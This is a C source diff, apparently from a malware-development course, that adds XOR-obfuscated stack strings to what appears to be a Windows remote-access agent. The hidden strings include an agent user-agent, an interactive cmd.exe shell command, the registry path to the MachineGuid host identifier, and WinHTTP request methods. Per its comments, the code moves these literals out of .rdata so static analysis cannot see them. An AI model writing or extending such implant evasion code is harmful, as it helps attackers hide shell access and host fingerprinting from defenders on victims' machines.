@@ -114,3 +114,209 @@ static VOID StrWinhttp(PWCHAR buf)
 }
 
 #define STRLEN_BYTES_WINHTTP 22   /* 11 chars * 2 */
+
+/* ---- C1 step 3b: functional strings that must exist at runtime ---- */
+#define STACKSTR_KEY_WIN 0x6B
+#define STACKSTR_KEY_UA 0xC3
+#define STACKSTR_KEY_CMD 0x94
+#define STACKSTR_KEY_REG 0x37
+#define STACKSTR_KEY_GUID 0x5D
+
+/* "Windows" - 7 chars + NUL. */
+static VOID StrPlatformWindows(PCHAR buf)
+{
+    volatile UINT32 key = STACKSTR_KEY_WIN;
+    buf[0] = (CHAR)(0x3Cu ^ key); /* W */
+    buf[1] = (CHAR)(0x02u ^ key); /* i */
+    buf[2] = (CHAR)(0x05u ^ key); /* n */
+    buf[3] = (CHAR)(0x0Fu ^ key); /* d */
+    buf[4] = (CHAR)(0x04u ^ key); /* o */
+    buf[5] = (CHAR)(0x1Cu ^ key); /* w */
+    buf[6] = (CHAR)(0x18u ^ key); /* s */
+    buf[7] = 0;
+}
+
+#define STRLEN_BYTES_PLATFORMWINDOWS 7
+
+/* L"minimal_agent/1.0" - 17 chars + NUL. */
+static VOID StrUserAgent(PWCHAR buf)
+{
+    volatile UINT32 key = STACKSTR_KEY_UA;
+    buf[0] = (WCHAR)(0xAEu ^ key); /* m */
+    buf[1] = (WCHAR)(0xAAu ^ key); /* i */
+    buf[2] = (WCHAR)(0xADu ^ key); /* n */
+    buf[3] = (WCHAR)(0xAAu ^ key); /* i */
+    buf[4] = (WCHAR)(0xAEu ^ key); /* m */
+    buf[5] = (WCHAR)(0xA2u ^ key); /* a */
+    buf[6] = (WCHAR)(0xAFu ^ key); /* l */
+    buf[7] = (WCHAR)(0x9Cu ^ key); /* _ */
+    buf[8] = (WCHAR)(0xA2u ^ key); /* a */
+    buf[9] = (WCHAR)(0xA4u ^ key); /* g */
+    buf[10] = (WCHAR)(0xA6u ^ key); /* e */
+    buf[11] = (WCHAR)(0xADu ^ key); /* n */
+    buf[12] = (WCHAR)(0xB7u ^ key); /* t */
+    buf[13] = (WCHAR)(0xECu ^ key); /* / */
+    buf[14] = (WCHAR)(0xF2u ^ key); /* 1 */
+    buf[15] = (WCHAR)(0xEDu ^ key); /* . */
+    buf[16] = (WCHAR)(0xF3u ^ key); /* 0 */
+    buf[17] = 0;
+}
+
+#define STRLEN_BYTES_USERAGENT 17
+
+/* L"cmd.exe /K chcp 65001 >nul" - 26 chars + NUL. */
+static VOID StrCmdline(PWCHAR buf)
+{
+    volatile UINT32 key = STACKSTR_KEY_CMD;
+    buf[0] = (WCHAR)(0xF7u ^ key); /* c */
+    buf[1] = (WCHAR)(0xF9u ^ key); /* m */
+    buf[2] = (WCHAR)(0xF0u ^ key); /* d */
+    buf[3] = (WCHAR)(0xBAu ^ key); /* . */
+    buf[4] = (WCHAR)(0xF1u ^ key); /* e */
+    buf[5] = (WCHAR)(0xECu ^ key); /* x */
+    buf[6] = (WCHAR)(0xF1u ^ key); /* e */
+    buf[7] = (WCHAR)(0xB4u ^ key); /*   */
+    buf[8] = (WCHAR)(0xBBu ^ key); /* / */
+    buf[9] = (WCHAR)(0xDFu ^ key); /* K */
+    buf[10] = (WCHAR)(0xB4u ^ key); /*   */
+    buf[11] = (WCHAR)(0xF7u ^ key); /* c */
+    buf[12] = (WCHAR)(0xFCu ^ key); /* h */
+    buf[13] = (WCHAR)(0xF7u ^ key); /* c */
+    buf[14] = (WCHAR)(0xE4u ^ key); /* p */
+    buf[15] = (WCHAR)(0xB4u ^ key); /*   */
+    buf[16] = (WCHAR)(0xA2u ^ key); /* 6 */
+    buf[17] = (WCHAR)(0xA1u ^ key); /* 5 */
+    buf[18] = (WCHAR)(0xA4u ^ key); /* 0 */
+    buf[19] = (WCHAR)(0xA4u ^ key); /* 0 */
+    buf[20] = (WCHAR)(0xA5u ^ key); /* 1 */
+    buf[21] = (WCHAR)(0xB4u ^ key); /*   */
+    buf[22] = (WCHAR)(0xAAu ^ key); /* > */
+    buf[23] = (WCHAR)(0xFAu ^ key); /* n */
+    buf[24] = (WCHAR)(0xE1u ^ key); /* u */
+    buf[25] = (WCHAR)(0xF8u ^ key); /* l */
+    buf[26] = 0;
+}
+
+#define STRLEN_BYTES_CMDLINE 26
+
+/* "SOFTWARE\Microsoft\Cryptography" - 31 chars + NUL. */
+static VOID StrRegPath(PCHAR buf)
+{
+    volatile UINT32 key = STACKSTR_KEY_REG;
+    buf[0] = (CHAR)(0x64u ^ key); /* S */
+    buf[1] = (CHAR)(0x78u ^ key); /* O */
+    buf[2] = (CHAR)(0x71u ^ key); /* F */
+    buf[3] = (CHAR)(0x63u ^ key); /* T */
+    buf[4] = (CHAR)(0x60u ^ key); /* W */
+    buf[5] = (CHAR)(0x76u ^ key); /* A */
+    buf[6] = (CHAR)(0x65u ^ key); /* R */
+    buf[7] = (CHAR)(0x72u ^ key); /* E */
+    buf[8] = (CHAR)(0x6Bu ^ key); /* slash */
+    buf[9] = (CHAR)(0x7Au ^ key); /* M */
+    buf[10] = (CHAR)(0x5Eu ^ key); /* i */
+    buf[11] = (CHAR)(0x54u ^ key); /* c */
+    buf[12] = (CHAR)(0x45u ^ key); /* r */
+    buf[13] = (CHAR)(0x58u ^ key); /* o */
+    buf[14] = (CHAR)(0x44u ^ key); /* s */
+    buf[15] = (CHAR)(0x58u ^ key); /* o */
+    buf[16] = (CHAR)(0x51u ^ key); /* f */
+    buf[17] = (CHAR)(0x43u ^ key); /* t */
+    buf[18] = (CHAR)(0x6Bu ^ key); /* slash */
+    buf[19] = (CHAR)(0x74u ^ key); /* C */
+    buf[20] = (CHAR)(0x45u ^ key); /* r */
+    buf[21] = (CHAR)(0x4Eu ^ key); /* y */
+    buf[22] = (CHAR)(0x47u ^ key); /* p */
+    buf[23] = (CHAR)(0x43u ^ key); /* t */
+    buf[24] = (CHAR)(0x58u ^ key); /* o */
+    buf[25] = (CHAR)(0x50u ^ key); /* g */
+    buf[26] = (CHAR)(0x45u ^ key); /* r */
+    buf[27] = (CHAR)(0x56u ^ key); /* a */
+    buf[28] = (CHAR)(0x47u ^ key); /* p */
+    buf[29] = (CHAR)(0x5Fu ^ key); /* h */
+    buf[30] = (CHAR)(0x4Eu ^ key); /* y */
+    buf[31] = 0;
+}
+
+#define STRLEN_BYTES_REGPATH 31
+
+/* "MachineGuid" - 11 chars + NUL. */
+static VOID StrMachineGuid(PCHAR buf)
+{
+    volatile UINT32 key = STACKSTR_KEY_GUID;
+    buf[0] = (CHAR)(0x10u ^ key); /* M */
+    buf[1] = (CHAR)(0x3Cu ^ key); /* a */
+    buf[2] = (CHAR)(0x3Eu ^ key); /* c */
+    buf[3] = (CHAR)(0x35u ^ key); /* h */
+    buf[4] = (CHAR)(0x34u ^ key); /* i */
+    buf[5] = (CHAR)(0x33u ^ key); /* n */
+    buf[6] = (CHAR)(0x38u ^ key); /* e */
+    buf[7] = (CHAR)(0x1Au ^ key); /* G */
+    buf[8] = (CHAR)(0x28u ^ key); /* u */
+    buf[9] = (CHAR)(0x34u ^ key); /* i */
+    buf[10] = (CHAR)(0x39u ^ key); /* d */
+    buf[11] = 0;
+}
+
+#define STRLEN_BYTES_MACHINEGUID 11
+#define STACKSTR_KEY_HASH 0x4E
+
+/* "course01" - local-build commit tag (C1 step 3a: the literal sat in .rdata). */
+static VOID StrCommitDefault(PCHAR buf)
+{
+    volatile UINT32 key = STACKSTR_KEY_HASH;
+    buf[0] = (CHAR)(0x2Du ^ key); /* c */
+    buf[1] = (CHAR)(0x21u ^ key); /* o */
+    buf[2] = (CHAR)(0x3Bu ^ key); /* u */
+    buf[3] = (CHAR)(0x3Cu ^ key); /* r */
+    buf[4] = (CHAR)(0x3Du ^ key); /* s */
+    buf[5] = (CHAR)(0x2Bu ^ key); /* e */
+    buf[6] = (CHAR)(0x7Eu ^ key); /* 0 */
+    buf[7] = (CHAR)(0x7Fu ^ key); /* 1 */
+    buf[8] = 0;
+}
+#define STACKSTR_KEY_X64 0x2D
+
+/* "x64" (C1 step 3a: was a .rdata literal). */
+static VOID StrX64(PCHAR buf)
+{
+    volatile UINT32 key = STACKSTR_KEY_X64;
+    buf[0] = (CHAR)(0x55u ^ key); /* x */
+    buf[1] = (CHAR)(0x1Bu ^ key); /* 6 */
+    buf[2] = (CHAR)(0x19u ^ key); /* 4 */
+    buf[3] = 0;
+}
+
+#define STACKSTR_KEY_X86 0xE1
+
+/* "x86" (C1 step 3a: was a .rdata literal). */
+static VOID StrX86(PCHAR buf)
+{
+    volatile UINT32 key = STACKSTR_KEY_X86;
+    buf[0] = (CHAR)(0x99u ^ key); /* x */
+    buf[1] = (CHAR)(0xD9u ^ key); /* 8 */
+    buf[2] = (CHAR)(0xD7u ^ key); /* 6 */
+    buf[3] = 0;
+}
+
+#define STACKSTR_KEY_GET 0x7A
+
+/* "GET" (C1 step 3a: was a .rdata literal). */
+static VOID StrGetMethod(PCHAR buf)
+{
+    volatile UINT32 key = STACKSTR_KEY_GET;
+    buf[0] = (CHAR)(0x3Du ^ key); /* G */
+    buf[1] = (CHAR)(0x3Fu ^ key); /* E */
+    buf[2] = (CHAR)(0x2Eu ^ key); /* T */
+    buf[3] = 0;
+}
+#define STACKSTR_KEY_GETW 0x7A
+
+/* L"GET" - the HTTP method (wide, as WinHttpOpenRequest wants). */
+static VOID StrGetMethodW(PWCHAR buf)
+{
+    volatile UINT32 key = STACKSTR_KEY_GETW;
+    buf[0] = (WCHAR)(0x3Du ^ key); /* G */
+    buf[1] = (WCHAR)(0x3Fu ^ key); /* E */
+    buf[2] = (WCHAR)(0x2Eu ^ key); /* T */
+    buf[3] = 0;
+}
